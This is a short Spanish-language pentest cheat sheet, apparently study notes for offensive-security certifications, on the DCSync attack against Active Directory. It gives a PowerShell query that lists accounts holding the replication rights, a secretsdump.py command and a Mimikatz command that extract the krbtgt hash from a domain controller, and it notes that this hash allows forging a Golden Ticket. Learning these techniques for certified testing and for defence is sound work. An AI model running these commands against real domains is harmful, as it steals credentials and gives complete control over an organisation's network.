---
title: DCSync
tags: [active-directory, oscp, crte, cpts]
---

## Qué es

Abusa del protocolo de replicación de Active Directory (MS-DRSR) para pedirle a un Domain Controller que "replique" las credenciales de cualquier usuario, incluyendo `krbtgt`. Requiere que la cuenta atacante tenga los derechos `DS-Replication-Get-Changes` y `DS-Replication-Get-Changes-All` sobre el dominio.

## Enumerar quién tiene el derecho

```powershell
Get-ObjectAcl -DistinguishedName "dc=dominio,dc=local" | Where-Object { $_.ObjectAceType -match "1131f6ad|1131f6aa" }
```

## Ejecutar

```bash
secretsdump.py dominio.local/usuario:password@10.10.10.10
```

O con Mimikatz desde un host con sesión de dominio:

```
lsadump::dcsync /domain:dominio.local /user:krbtgt
```

## Impacto

Con el hash de `krbtgt` se puede forjar un Golden Ticket — persistencia total sobre el dominio.
